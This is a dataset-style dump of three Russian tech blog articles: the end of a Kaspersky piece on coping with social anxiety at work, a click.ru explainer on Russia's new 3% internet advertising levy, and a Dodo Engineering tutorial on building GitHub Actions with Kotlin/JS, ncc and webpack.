помогает. Не обязательно всю историю рассказывать на дейлике, но держать в голове ее стоит. Лично мне этот ход помогает ослабить синдром самозванца.   Как определить, что стоит рассказывать на дейлике, а чего не стоит? Если у вас есть какой-то блокер, то ждать, конечно, нельзя. Тем более, если ваш рассказ уложится в одну-две минуты. Однако если вы чувствуете, что ваш рассказ выходит за пределы пары минут и содержит много технических деталей, лучше всего воспользоваться дейликом, чтобы запросить (как бы тревожно это ни звучало) отдельную встречу.  Встречи Общение с лидом и дейлики — это, в каком-то смысле, тоже встречи. Но здесь я имею в виду то самое, где собираются дизайнеры, бэкендеры, ПМ-ы, тестировщики и все-все-все остальные и начинают что-то обсуждать. Более того, там вас могут о чем-то спросить… Ну как, ваш пульс уже зашкаливает?  Для начала надо признаться самому себе: такие встречи нужны, без них будет хуже. Есть теория по шарингу знаний, модель Нонака-Такеучи. Один из этапов этого шаринга — социализация, то есть процесс, когда несколько специалистов (людей, обладающих знаниями, которые не получится найти в Notion или Confluence) собираются вместе и делятся этими знаниями. Чаще всего на общих встречах так и происходит: обсуждается что-то горячее, что еще не зафиксировано в базах знаний, но в контексте чего должна быть вся команда проекта.  Избегать таких встреч, прямо скажем, опасно для карьеры :)   Еще одна фобия: вам может быть что-то непонятно. Я в таких случаях использую ручку и бумажку. Прямо выписываю себе список незнакомых технологий, фреймворков и аббревиатур, которые всплывают в ходе созвона. Например, встретилась мне аббревиатура CDN — и я вроде бы понимаю, о чем речь, но не до конца. Фиксирую на листочке, а после встречи выясняю, что это Content Delivery Network.  Также не забывайте, что во время встречи можно открыть IDE-шку и посмотреть какой-нибудь класс или метод прямо в ней. Когда настанет время переходить к разработке, вам не придется начинать все сначала.  И еще, возвращаясь к синдрому самозванца. Примите как факт, что раз вы присутствуете на встречах, то ВЫ СПЕЦИАЛИСТ. Каждый раз, когда меня зовут на встречу, я в какой-то мере радуюсь, что могу быть полезным.  Как меньше страдать Когда социофобушку становится тяжко, его первая мысль: а не найти ли другую работу, где встреч будет меньше? План, вроде, хороший, но, скорее всего, так не получится. В любом случае будет общение с маркетологами, ПМ-ами и прочими людьми другими коллегами. Опять же, если ВДРУГ у вас получилось запустить стартап в одиночку в гараже — обязательно отметьтесь в комментариях :) Ну а если нет, то ниже вы найдете несколько рекомендаций, как социализироваться.  Составляйте план того, что вы делаете. Я использую достаточно простой подход: задаю буквально три-пять вопросов «почему». Они позволяют глубже погрузиться в тему, понять, что я делаю и зачем это происходит. Не надо листов А4, все важное должно укладываться на стикере. Даже если ваш план не является планом в полном смысле этого слова, это все равно гораздо лучше, чем его отсутствие. Так вы более осознанно подходите к делу.  Пишите шпаргалки. Пример из личного опыта: во время созвона, где обсуждался порядок кнопок в приложении (нечто такое, что мне в принципе неинтересно), я отвлекся. И в какой-то момент услышал в наушниках: «А на этот вопрос нам ответит Станислав». Ну а я же прослушал, о чем речь, и был не в курсе, какой именно вопрос. Так и завис безмолвно… Уж столько времени прошло, а мне до сих пор немного неуютно, когда вспоминаю :-/  Чтобы не сталкиваться в этот момент со ступором, используйте спасительные формулировки. Например, в данном случае можно было сказать: «Извините, пожалуйста, что-то со связью было, не могли бы вы повторить вопрос». А если вдруг считаете, что ваш стресс может подвести вашу память, то реплики можно записать на бумажке и наклеить на монитор. И в критический момент глянуть на шпаргалку и на автомате прочитать ее. Ситуация разрешится.  Не пытайтесь все продумать заранее. Встречи — это не экзамены, тут невозможно ничего вызубрить: вариантов вопросов масса, а правильные ответы не всегда существуют. Варианта с тремя «почему» вполне достаточно.   Помните, что вы с коллегами на одной стороне. Ни у кого нет цели завалить вас, напустить токсичности и быстренько сбежать. Команда хочет решить общую проблему. Просто, возможно, у вас разные взгляды на то, как ее решать.  Старайтесь избегать слова «да». Это банальная штука, но иногда «да» встречается в контексте «да, да, да, отстаньте, пожалуйста». Звучать оно может как от вас, когда вы отвечаете на вопрос «на отвали», так и от ваших коллег. В первом случае постарайтесь разобраться, о чем речь, вам же с этим дальше как-то жить придется. На худой конец, повторите все, что было сказано, то есть как-то резюмируйте; если что — вас поправят. Во втором — задавайте уточняющие вопросы.  Вместо выводов Если вы социофобушек  Не пытайтесь бороться со страхом. Это бесполезно, а от бесконечной борьбы вы будете еще больше волноваться, и сделаете себе еще хуже. Периодически давайте себе встряску. Я это называю закаливанием. Попробуйте сходить на дебаты, на какие-нибудь «ролевки». Я, например, уже дозрел до роли где-нибудь в самодеятельном театре (хотя каюсь, ножками пока еще туда не добрался :)) Но я понимаю, что со временем это поможет проще переносить те же публичные выступления.  Изживайте свой синдром самозванца.    Если вы тимлид и у вас в команде социофобушек  Задайте себе вопрос: «А плохо ли это?» Возможно, в силу своих особенностей, он сможет больше перформить. Например, копаться в задачах, на которые у экстравертов недостает усидчивости. А что до созвонов без камеры — так ли это критично, если для самого коллеги это важная часть комфорта?  Если человек не дает достаточного фидбэка, идите на банальный, но весьма действенный компромисс: коммуникации через текст. Согласитесь, далеко не обязательно каждый раз на дейлике говорить непосредственно в микрофон.   Если вы сами тимлид-социофобушек  Ситуация нестандартная, тем не менее все вышеизложенные рекомендации можно суммировать и применять с поправкой на здравый смысл. Например, дейлики в команде можно заменить письменными статусами, но управлять командой совсем без встреч едва ли получится. Заботьтесь о своем здоровье. Потому что при такой нагрузке потребность высыпаться, употреблять здоровую пищу и заниматься какой-либо физической нагрузкой становится железной необходимостью.   Ну и финальное. Найдите себе компанию, где будут с уважением относиться к вам как к социофобушку. Буду краток: мне в этом плане сильно комфортно. Приходите к нам в «Лабораторию Касперского» и убедитесь сами :)"
17,Отчисление 3% с дохода от интернет-рекламы: кто должен платить и как рассчитать?,Click.ru,Рекламная экосистема,0,"Реклама и маркетинг, Поисковые технологии, Веб-сервисы",2025-04-10,"1 апреля вступили в силу важные изменения в законе N 38-ФЗ «О рекламе». Теперь часть участников рынка интернет-рекламы обязана платить отчисление 3% с дохода от нее.26 марта был опубликован проект Постановления Правительства «Об утверждении особенностей исчисления и уплаты обязательных отчислений, предусмотренных частью 1 статьи 182 Федерального закона «О рекламе», и порядка осуществления мониторинга за полнотой и своевременностью уплаты таких отчислений». На данный момент он находится в стадии публичного обсуждения, поэтому его содержание к моменту публикации окончательной версии может измениться.В этой статье эксперты click.ru разберут, кого коснется нововведение, как избежать лишних трат и какие стратегии адаптации помогут рекламным агентствам, маркетологам и фрилансерам не терять прибыль.Что изменилосьФедеральный закон от 26 декабря 2024 г. № 479-ФЗ внес изменения в Закон о рекламе, добавив новую статью 18.2 «Обязательные отчисления за распространение рекламы в информационно-телекоммуникационной сети «Интернет».Вот основные нововведения:Появилось обязательное отчисление 3% от квартального дохода за распространение в интернете рекламы, направленной на привлечение внимания потребителей в России;Эти деньги идут в федеральный бюджет;Контролирует и рассчитывает отчисления Роскомнадзор.Кто должен платить отчисленияПроизводить 3%-ные отчисления обязаны:рекламораспространители. Площадки, где размещается реклама;операторы рекламных систем. Обеспечивающие показ рекламы сервисы;лица, действующие в интересах рекламодателя и/или рекламораспространителя. Это могут быть агентства и фрилансеры, работающие от имени рекламодателя.Кроме того, в ч. 10 статьи 18.2 указано, что платить отчисления также обязаны лица, «осуществляющие действия в целях распространения рекламы в информационно-телекоммуникационной сети «Интернет» по поручению и за счет рекламодателя и (или) рекламораспространителя или оказывающих услуги по распространению рекламы в информационно-телекоммуникационной сети «Интернет» в интересах таких рекламодателя и (или) рекламораспространителя».Значит, если вы запускаете рекламу для клиента — вы тоже попадаете под этот закон.Важно: если 3% заплатил тот, кто первым получил деньги от рекламодателя, например рекламная площадка, то другие участники цепочки платить не обязаны. Однако агенты обязаны оплатить только 3% от полученного ими вознаграждения, а не ото всей суммы рекламного бюджета. В этом случае 3% от дохода от рекламы обязан оплатить другой участник цепочки, обычно оператор размещения рекламных материалов.Как рассчитывается отчислениеНовый платеж называется «ОРР» — «отчисление с дохода от распространения рекламы». С юридической точки зрения это не налог и не сбор, поэтому к нему применяются другие правила.Отчисление рассчитывается на основе дохода от деятельности, которая связана с размещением интернет-рекламы.Для площадок и рекламных систем это вся сумма за размещение рекламы, а для агентств и фрилансеров — только их комиссия или вознаграждение, если они работают по агентской модели.В законе не уточняется, должно ли отчисление рассчитываться с суммы до или после вычета НДС. Мы предполагаем, что он будет исключен из базы расчета, так как ОРД изменили форму подачи данных и внедрили ставку НДС. Однако остается риск, что расчет будет происходить с полной суммы с учетом НДС.Изначально многие беспокоились, что 3%-ные отчисления придется платить всем участникам цепочки. Однако проект Постановления уточнил: платит только один из них — тот, кто первым получил оплату за размещение рекламы. Остальные могут избежать отчислений.Однако если в цепочке участвует агент, то он имеет право по договоренности заплатить 3% с оборота, но обязан платить 3% только от своего вознаграждения. В этом случае за оператором сохраняется обязанность оплаты 3% от дохода, полученного за размещение рекламы.Сроки и порядок уплатыОтчисление выплачивается по кварталам. До 15 числа второго месяца после окончания квартала Роскомнадзор рассчитает сумму. До 5 числа третьего месяца нужно выплатить ее. Если есть расхождения — можно подать уточнение в течение 10 дней после расчета.Что будет, если не заплатитьПока конкретные штрафы в ст. 18 не прописаны, но в случае неуплаты отчисления 3% будут применяться меры ответственности по закону «О рекламе»:физлица — от 2000 до 2500 ₽;ИП и должностные лица — от 4000 до 20 000 ₽;юрлица — от 100 000 до 500 000 ₽.Кому можно не платить 3%От уплаты отчислений освобождаются:Телеканалы, радиостанции и информационные агентства, если реклама размещается на их собственных сайтах;Зарегистрированные сетевые издания, которые соответствуют определенным критериям (учреждены госорганами, получают бюджетные ассигнования или имеют значительные тиражи печатных изданий);Обязательные общедоступные телеканалы в случае распространения через определенные информационные ресурсы.Маркетплейсы и различные типы продвиженияПо мнению некоторых законодателей, маркетплейсы (Ozon, Wildberries, Авито и другие) могут не подпадать под новый закон, так как занимаются не прямой рекламой, а продвижением товаров.Это может касаться и других направлений интернет-маркетинга, включая:SEO. Считается «оптимизацией», а не рекламой;SMM. Если нет явных рекламных публикаций;контент-маркетинг. Информационные и другие материалы тоже могут не считаться рекламой.Но официальных разъяснений пока нет, поэтому действовать стоит осторожно.Как адаптироваться к новому отчислению Для начала приведем общие советы.Выделение рекламного бюджета и услуг в отдельные договоры.Корректное оформление договоров и актов счетов фактур на услуги по размещению рекламы.Совпадение данных в маркировке и разалокации с финансово-юридической схемой.Стратегии для агентствТеперь рассмотрим и сравним три конкретные стратегии для рекламных агентств.1. Включение сбора в цену (самый легкий вариант). Увеличение цены для рекламодателя. Заключение договора на услуги, где уже учтены и стоимость рекламы, и отчисление 3%. Так клиент сразу понимает финальную сумму, а агентство не тратит время на перерасчеты.2. Запуск рекламы из кабинета клиента (средний уровень сложности). Этот способ позволяет не участвовать в цепочке платежей за рекламу и избежать сбора. Клиент сам оплачивает рекламу в своем рекламном кабинете, а агентство оказывает только услуги по настройке и сопровождению, не участвуя в распространении.3. Работа через агентский договор (сложный, но выгодный вариант). Если работать по агентскому договору, то сбор в 3% рассчитывается не со всего рекламного бюджета, а только с комиссии. Агентство выступает посредником, а не исполнителем услуг. Клиент платит ему агентское вознаграждение, с которого рассчитывается отчисление.Разберем пример расчета отчисления при каждой стратегии для цепочки Рекламодатель → Агентство → Рекламная площадка. Допустим, рекламный бюджет клиента — 120 000 ₽ с НДС, а все дополнительные расходы переложены на конечного рекламодателя.ПараметрДоговор услугАккаунт клиентаАгентский договорБюджет без НДС100 000 ₽100 000 ₽100 000 ₽Отчисления рекламной площадки0 ₽3000 ₽(3% от 100 тыс)3000 ₽(3% от 100 тыс)Отчисления агентства3000 ₽(3% от 100 тыс)0 ₽150 ₽ (3% от 5 тыс)(3% от 5 тыс)Общая сумма отчислений3000 ₽3000 ₽3150 ₽Итоговая стоимость для клиента103 000 ₽103 000 ₽103 150 ₽Изменение стоимости+3%+3%+3,15%Агентская комиссия8000 ₽0 ₽8000 ₽Прибыль агентства5000 ₽0 ₽8000 ₽Здесь предполагается, что НДС не включается в базу для расчета отчислений, а доход агентства формируется за счет ретробонусов от рекламных платформ или/и в рамках отдельного договора услуг, не участвующего в маркировке.Как быть клиентам click.ruМы уже обратились в Роскомнадзор за разъяснениями. Пока подзаконные акты не утверждены, мы не будем взимать дополнительных сборов и будем держать пользователей в курсе всех изменений.Чтобы разобраться во всех деталях нового закона, на конкретных примерах увидеть, как будет начисляться и уплачиваться сбор, узнать, как адаптировать свой бизнес к изменениям, можно зарегистрироваться на бесплатный вебинар от click ru, который пройдет 23 апреля в 15:00 по Москве. За регистрацию вы получите подробный план по подготовке к изменениям и другие полезные бонусы.Последствия введения отчисленийОтметим основные ожидаемые изменения на рынке интернет-рекламы.Упростится цепочка размещения рекламы, станет меньше посредников.Агентства будут переходить на агентские схемы работы.Рекламные услуги подорожают, и затраты будут возложены на рекламодателей.Возможно появление «серых» схем обхода отчислений.Новое 3%-ное отчисление — это серьезное изменение для рынка. И хотя его механизм пока окончательно не утвержден, лучше подготовиться заранее: пересмотреть договоры, изменить схемы работы и понимать, как избежать лишних трат.Мы продолжим мониторить ситуацию. Следите за обновлениями в Telegram-канале click.ru."
18,KotlinJS в GitHub Actions,Dodo Engineering,"О том, как разработчики строят IT в Dodo",0,"Веб-разработка, Программное обеспечение, Мобильные технологии",2025-04-10,"ВведениеGitHub Actions (GHA) — это отличный инструмент для настройки CI/CD для тех, кто пользуется GitHub. Существует и GitHub Marketplace, где можно найти тысячи готовых GHA под любые задачи. Но всегда найдётся процесс, который захочется настроить под себя — тогда нам придётся написать кастомный GHA.В этой статье я покажу, как создать свой GHA на Kotlin/JS, используя плагин Kotlin Multiplatform. Особенно это будет интересно Android-разработчикам, ведь Kotlin — это наш родной язык, и мы можем применять уже имеющиеся навыки для написания GHA, не углубляясь в JavaScript.В конце статьи вас ждёт готовый шаблон в GitHub. С его помощью вы сможете сразу приступить к написанию GHA на Kotlin/JS, минуя написание бойлерплейт-кода. О нём я и расскажу в этой статье.Погнали!GitHub ActionsGitHub Actions — это встроенный в GitHub инструмент, который даёт возможность настраивать CI/CD процессы. Например, когда в репозитории происходит событие, коммит или pull request, GHA автоматически запускает нужные скрипты. Одним словом — это наш инструмент для CI/CD.В GHA всё начинается с Workflow — именно его GitHub Actions выполняет в ответ на определённые события. Каждый Workflow состоит из одного или нескольких jobs, которые могут выполняться параллельно. А внутри каждого job есть steps, выполняющиеся последовательно.Step может быть обычным shell-скриптом или отдельным Action. Последние представляют собой «строительные блоки» GitHub Actions. Они позволяют переиспользовать и комбинировать готовые решения.Иногда нам нужно написать собственный Action, чтобы реализовать особый сценарий. Например, в моём случае нужно было вычислять Commit Lead Time. У вас это могут быть другие задачи: особая логика управления версиями, загрузка сборок в специфичные хранилища и т.д. Чтобы создать кастомный GitHub Action, мы можем выбрать один из трёх вариантов:Composite Action — это комбинация нескольких команд и других actions, объединённых в одном месте. Как Compound View, а не Custom View в мире Android-разработки;Docker Action — это Action, упакованный в Docker-контейнер. В таком случае вы можете выбрать любой язык. Если ваш любимый язык Go, пишите на Go. Здесь главный недостаток в том, что контейнер должен работать на Linux. А значит он не подойдёт, если вам нужно будет что-то запустить на macOS (например, инструменты для iOS);JavaScript Action — это Action, который запускается в среде Node.js, причём быстрее, чем Docker, потому что Node.js уже работает в раннерах, и не надо разворачивать контейнер. Если вы знакомы с экосистемой Node.js, этот вариант отлично вам подойдёт.Напишем простейший GHAЧтобы написать GitHub Action на Kotlin/JS, нужно понимать, как создавать кастомные экшены на обычном JavaScript. Если вы знаете, как писать GitHub Actions на JS, смело переходите к следующему разделу статьи.Также я добавлю дисклеймер. Я в первую очередь Android-разработчик и большую часть времени работаю с Kotlin/Java. В JavaScript и его экосистеме я не считаю себя экспертом, поэтому в статье могут встречаться вещи, которые покажутся очевидными или даже баянистыми для опытных JS-разработчиков. Прошу отнестись с пониманием: моя цель — помочь другим Android-разработчикам и всем, кто привык к Kotlin, открыть возможность создавать кастомные GitHub Actions с помощью Kotlin/JS.Нам потребуются знания таких слов, как Nodejs, npm и ncc. Я не буду вдаваться в их подробное описание, лишь кратко перечислю:Node.js — это среда выполнения JavaScript-кода, которая позволяет запускать его не только в браузере, но и в любом другом окружении;npm — менеджер пакетов в мире Node.js;ncc — один из популярных инструментов (бандлеров), который упаковывает JS-код в единый файл.На схеме ниже изображён GitHub Action на JS, но по сути это обычное приложение, которое работает в среде Node.js.Точка входа в GHA — файл action.yml. Здесь описываются метаданные Action: имя, описание, входные и выходные данные и т.д.Напишем простой action.yml:name: 'Roll a dice' description: 'Simple Github Action for roll a dice' inputs:  number-of-sides:    description: 'How many sides the dice has'    required: true    default: '6' outputs:  concat:    description: 'Result of rolling the dice' runs:  using: 'node20'  main: 'index.js'Обратите внимание, что мы указали, где будет лежать сам исполняемый файл main: 'index.js'. Это означает, что исполняемый код будет лежать в текущей директории в файле index.js.Теперь нам нужен Workflow, в рамках которого мы запустим и протестируем наш Action. Здесь стоит обратить внимание, что первым шагом (step) мы вызываем Action actions/checkout@v4. Он нужен, чтобы получить исходный код, в котором и будет написана сама логика экшена. Второй шаг — выполнение нашего экшена uses: ./, потому что action.yml лежит в текущей директории. Третий шаг — вывод результата.on: [push]  jobs:  roll_the_dice_job:    runs-on: ubuntu-latest    name: Roll the dice    steps:      - name: Checkout        uses: actions/checkout@v4      - name: Roll the dice step        id: roll        uses: ./        with:          number-of-sides: '12'      - name: Show the result step        run: echo ""The die rolled at ${{ steps.roll.outputs.result }}""Теперь можно написать сам action в файле index.js.const core = require('@actions/core');  try {    const sides = core.getInput('number-of-sides');    console.log(`Start rolling a dice with ${sides}!`);    const result = rollDice(sides)    core.setOutput(""result"", result); } catch (error) {    core.setFailed(error.message); }  function rollDice(sides) {    const numberOfSides = parseInt(sides, 10);    ...    return Math.floor(Math.random() * numberOfSides) + 1; }Этот action «кидает кубик» и показывает, какое число выпало. Протестировать наш action можно двумя путями:запушить код в Github и запустить workflow;запустить локально через инструмент act (https://nektosact.com/).Последний штрих — это добавление ncc. Как вы могли заметить, в Node.js много библиотек и все они складываются в папке node_modules. Чтобы не таскать с собой эту кучу файлов, лучше упаковать всё в один исполняемый файл, где будет только то, что надо. Это можно сделать через паккер nnc. Это не единственный инструмент — есть и другие. Например, webpack, о котором мы позже поговорим, но сам GitHub в своей документации рекомендует именно ncc.Запускаем ncc:npm i -g @vercel/ncc ncc build index.js --license licenses.txtИ получаем итоговую схему работы:Создание простого Kotlin/JS ActionКак нам здесь поможет Kotlin/JS? Всё просто. Kotlin-код может компилироваться под разные платформы или таргеты: в байт-код Java (для JVM), в бинарные файлы под нативные платформы (.so, .a, .framework) и в JavaScript (JS). Благодаря этому мы можем использовать Kotlin для разработки приложения, которое в итоге будет работать в среде Node.js. Т.е. мы пишем на Kotlin, компилятор генерирует JS-код, и всё это запускается на Node.js.Kotlin-complies.pngКогда Gradle с плагином Kotlin/JS или Multiplatform скомпилирует наш код, он автоматически сгенерирует JavaScript и сформирует файл package.json, где пропишет все необходимые зависимости npm. Мы получим привычный GitHub Action, написанный на JS.GHA-03-kotlinjs.pngВ Gradle необходимо подключить Kotlin-плагин для JavaScript. Существует два варианта:kotlin(""js"").kotlin(""multiplatform"").По факту эти подходы не отличаются друг от друга — они оба используют одни и те же модули под капотом. Тем не менее в официальной документации JetBrains рекомендуется использовать именно kotlin(""multiplatform""). Видимо, это более гибкий и масштабируемый подход, если в дальнейшем вы будете делать сборку и под JVM, и под Native.plugins {    kotlin(""js"") version ""2.0.0"" }  или  plugins {    kotlin(""multiplatform"") version ""2.0.0"" }Конфигурируем наш Kotlin плагин. Следующий шаг — конфигурация модуля для компиляции JS-кода. Ниже показано, как это обычно делается в файле build.gradle.kts, если вы используете Kotlin Multiplatform или Kotlin JS.kotlin {     js(IR) {        nodejs {            binaries.executable()        }    }     sourceSets {        val jsMain by getting {            dependencies { }        }    } }Здесь мы указываем, что используем IR-бэкенд для Kotlin/JS (это более современный режим компилятора), и настраиваем таргет nodejs, чтобы итоговый код можно было запустить в Node.js.Файлы action.yml и workflow main.yml при этом не меняются — структура GitHub Action остаётся прежней.Чтобы использовать любую npm-библиотеку (например, @actions/core) в проекте на Kotlin/JS, мы указываем её в секции зависимостей через метод npm в Gradle. Всё, что вы укажете здесь, будет записано в сгенерированный package.json, а потом скачано в папку node_modules.В мире GitHub Actions есть официальный набор инструментов GitHub Actions Toolkit, а @actions/core — один из его ключевых пакетов. Он предоставляет функции и утилиты, упрощающие взаимодействие с GitHub Actions: чтение входных параметров (inputs), выставление выходных (outputs), логирование и т.д.sourceSets {    val jsMain by getting {        dependencies {            implementation(npm(""@actions/core"", ""1.4.0""))        }    } }Чтобы воспользоваться методами из @actions/core в Kotlin/JS-коде, мы объявляем в отдельном файле внешние функции с помощью аннотации @file:JsModule(""@actions/core""). Ключевое слово external указывает на то, что данные функции не реализованы на Kotlin напрямую, а подключаются из внешнего JS-кода.@file:JsModule(""@actions/core"") package com.example.utils.actions  external fun setOutput(name: String, value: Any) external fun setFailed(message: String)Подключив и описав методы из @actions/core, мы можем приступить к написанию собственного GitHub Action на Kotlin/JS. Используем функции setOutput и setFailed, чтобы работать с результатами и ошибками внутри экшена.import com.example.utils.actions.*  suspend fun main() {    setOutput(""failed"", false)    try {        val result = ""Custom String! Congratulations!""        setOutput(""result"", result)        print(result)    } catch (ex: Exception) {        setFailed(""Error while performing GHA"")    } }Обратите внимание, что функция main помечена как suspend. Это необязательно, но даёт возможность при необходимости использовать корутины или асинхронные вызовы.Вызываем ./gradlew build и смотрим, что скомпилировал нам плагин Kotlin Multiplatform. Команда скомпилирует ваш Kotlin-код в JavaScript и добавит все необходимые зависимости в node_modules.После сборки удобно свести все зависимости и исходный JS-код в один исполняемый файл. Для этого используем ncc. Ниже описаны шаги, как получить итоговый файл через ncc:найти скомпилированные файлы ./build/js/packages/test-gha-1/kotlin;Выполнить ncc:ncc build test-gha-1.js --license licenses.txt;Получить результат в:  ./build/js/packages/test-gha-1/kotlin/dist;Скопировать оттуда в: ./dist.Чтобы это не писать руками, можем всё сделать в Gradle-таске:tasks.register<Exec>(""buildAndPackWithInstalledNCC"") {    dependsOn(""build"")    commandLine(""npx"", ""ncc"", ""build"",                     ""${layout.buildDirectory.get()}/js/packages/${project.name}         /kotlin/${project.name}.js"",          ""--license"", ""licenses.txt"", ""-o"", ""dist"") }Такой вариант требует предустановки ncc. Для удобства мы можем установить ncc автоматически через Gradle, указав его в разделе devNpm. Тогда Gradle сам добавит утилиту в package.json в разделе devDependencies.sourceSets {    val jsMain by getting {        dependencies {            implementation(npm(""@actions/core"", ""1.4.0""))            implementation(devNpm(""@vercel/ncc"", ""0.38.1""))        }    } }Полученный package.json будет выглядеть примерно так:{ ...  ""devDependencies"": {    ""@vercel/ncc"": ""0.38.1"",    ""typescript"": ""5.4.3"",    ""source-map-support"": ""0.5.21""  },  ""dependencies"": { ... }, }Чтобы автоматизировать процесс, создадим две задачи в Gradle: installNodeModules и buildAndInstallAndPackWithNCC. Первая установит нужные пакеты, а вторая скомпилирует KotlinJS-код и запустит ncc:tasks.register<Exec>(""installNodeModules"") {    dependsOn(""build"")    workingDir = file(""${layout.buildDirectory.get()}/js/packages/${project.name}/"")    commandLine(""npm"", ""install"") }  tasks.register<Exec>(""buildAndInstallAndPackWithNCC"") {    dependsOn(""installNodeModules"")    workingDir = file(""${layout.buildDirectory.get()}/js/packages/${project.name}/"")    commandLine(""npx"", ""ncc"", ""build"", ""./kotlin/${project.name}.js"", ""--license"",                ""licenses.txt"", ""-o"", ""${layout.projectDirectory}/dist"") }Сделаем круче — воспользуемся API NCCNCC можно использовать как библиотеку и напрямую обращаться к функциям через Kotlin, а не запускать его из командной строки. Для этого создадим отдельный Gradle-модуль, где установим в зависимости @vercel/ncc. Обратите внимание: здесь уже не devNpm, а просто npm.plugins {    kotlin(""multiplatform"") version ""2.0.0"" }  kotlin {    // all the same... }  dependencies {    implementation(""org.jetbrains.kotlinx:kotlinx-coroutines-core:1.5.0"")    implementation(""org.jetbrains.kotlinx:kotlinx-nodejs:0.0.7"")    implementation(""org.jetbrains.kotlin-wrappers:kotlin-js:1.0.0-pre.785"")    implementation(npm(""@vercel/ncc"", ""0.38.1"", generateExternals = false)) }Опишем внешний интерфейс для библиотеки @vercel/ncc, чтобы вызывать её функции:@JsModule(""@vercel/ncc"") external fun ncc(input: String, options: NccOptions = definedExternally): Promise<NccResult>  external interface NccResult {    val code: String    val map: String?    val assets: AssetMap? }  external interface NccOptions {    var cache: dynamic    var externals: List<String>    ... }Главный метод ncc возвращает Promise с объектом, содержащим объединённый код, карту исходников (sourceMap) и другие вспомогательные данные.val nccResult = ncc(    input = inputPath,    options = jsObject {        sourceMap = true        license = ""LICENSES""    } ).await()  external interface NccResult {    val code: String    val map: String?    val assets: AssetMap? }Далее пишем функцию main, где вызываем ncc и обрабатываем его результат:suspend fun main() {    runCatching {        val (inputPath, outputPath) = readArgs(process.argv)         val combinedCode = combineCode(            inputPath = inputPath,            outputPath = outputPath,            fileName = ""index.js""        )         createOutputFolder(outputPath = outputPath)         with(combinedCode) {            copyCode()            copyMapping()            copyAssets()        }    }.onFailure { throwable ->        console.error(throwable)        process.exit(1)    } }Чтобы всё это запустить, передаём в Gradle-таске jsNodeProductionRun пути к файлам через метод args:tasks.named<NodeJsExec>(""jsNodeProductionRun"") {    val inputPath =          ""${rootProject.layout.buildDirectory.get()}/js/packages/${rootProject.name}/""    val outputPath = ""${rootProject.layout.projectDirectory}/dist/""    args(inputPath, outputPath) } И запускаем:./gradlew build :ncc:jsNodeProductionRunТеперь у нас есть полноценный модуль, который программно вызывает ncc API, комбинирует весь JS-код и зависимости. На схеме это выглядит так:WebpackWebpack — это один из наиболее популярных бандлеров JavaScript-приложений. В нашем случае функции Webpack и ncc идентичны. Webpack берёт скомпилированный JS-код, включая все зависимости, и собирает в единый файл.Однако при использовании ncc я столкнулся с ошибкой, связанной с модулем abort-controller. Ошибка выглядит так:https://api.github.com/repos/[...]/[...]/git/refs/tags  failed with exception: Error: Cannot find module 'abort-controller' |    Require stack: | -         ./dist/index.jsКак оказалось, это известная проблема, на которую есть открытая задача в трекере KTOR-405. Поэтому пока мы вынуждены пользоваться хаком, чтобы устранить эту ошибку вручную. Ниже показан пример, как можно руками подправить конфиг Webpack, чтобы подменить пути к проблемным пакетам:private fun WebpackInputParams.toWebpackConfig(): WebpackConfig {    return WebpackConfig(        projectName = name,        inputFilePath = ""$buildDir/js/packages/$name/kotlin/$name.js"",        outputDirPath = outputDir,        outputFileName = ""index.js"",        modules = listOf(...),        aliases = mapOf(            ""node-fetch$"" to ""node-fetch/lib/index.js"",            ""abort-controller$"" to ""abort-controller/dist/abort-controller.js"",        )    ) }  ...  if (content.contains(""eval('require')"")) {    val fixedContent = content.replace(""eval('require')"", ""require"")    writeFileSync(path, fixedContent) }Здесь мы в явном виде переопределяем пути для node-fetch и abort-controller, а также устраняем вызов eval('require'), чтобы всё корректно работало при сборке. Это не самое изящное решение, но что поделать.Если вы знаете лучший способ обойти эту ошибку, обязательно напишите в комментариях. Буду признателен!Таким образом, у нас есть как минимум два способа собрать результат в один JS-файл:./gradlew build :ncc:jsNodeProductionRun;./gradlew build :webpack:jsNodeProductionRun.Обе команды выполняют одну и ту же задачу, но разными инструментами. Ncc показался мне проще в настройке, однако Webpack смог исправить баг.TemplateВ этой статье мы разобрали много мелких деталей. Может показаться, что написать кастомный GitHub Action на Kotlin/JS сложно. Слишком много различных шагов. Чтобы упростить вам и себе задачу, я подготовил шаблон на GitHub. В этом репозитории уже настроены все необходимые инструменты: плагин, зависимости, сборка в единый файл через ncc и Webpack и так далее. Если захотите что-то доработать или улучшить, смело присылайте Pull Request!https://github.com/makzimi/kotlin-github-actionСтруктура main метода шаблона похожа на то, что я описывал в статье:Читаем входные параметры.Запускаем основную бизнес-логику.Устанавливаем результат или ошибку.suspend fun main() {    val input = buildGHAInput()     try {        group(""Action body"") {            val output = runAction(input = input)             if (output.success) {                setOutput(Result.value, output.result)            } else {                setFailed(output.errorText.orEmpty())            }        }    } catch (e: Exception) {        setFailed(""Error while performing GitHub Action: ${e.message}"")    } }Благодаря этому шаблону вам не придётся возиться с подготовительным кодом. Вы сможете сразу приступить к написанию собственной логики экшена.ВыводыВ GitHub Marketplace действительно много готовых экшенов, но далеко не все из них подойдут именно вам. У меня возник кейс, для которого мне понадобился кастомный GitHub Action.Docker-вариант на первый взгляд кажется удобнее, особенно если вы не планируете писать на Kotlin.Но если вы хотите применить Kotlin для CI/CD, то это отличный способ использовать уже знакомый язык на новую задачу. Написание GitHub Action на Kotlin/JS не будет слишком сложной задачей, особенно если пользоваться шаблоном и не писать бойлерплейт-код.Круто, что Kotlin позволяет компилировать код под разные платформы. Сегодня вы пишете Android-приложение, а завтра точно так же на Kotlin создаёте GitHub Action.Если у вас остались вопросы или идеи, как улучшить процесс, обязательно делитесь ими в комментариях или открывайте Pull Request к шаблону!Спасибо, что дочитали статью! Если вам интересен мой опыт, но лень читать большие тексты, подписывайтесь на Telegram-канал «Мобильное чтиво». Там я в формате постов делюсь своими мыслями про Android-разработку и не только.О том, как мы развиваем IT в Додо в целом, читайте в Telegram-канале Dodo Engineering. Там мы рассказываем о нашей жизни, культуре и последних разработках."
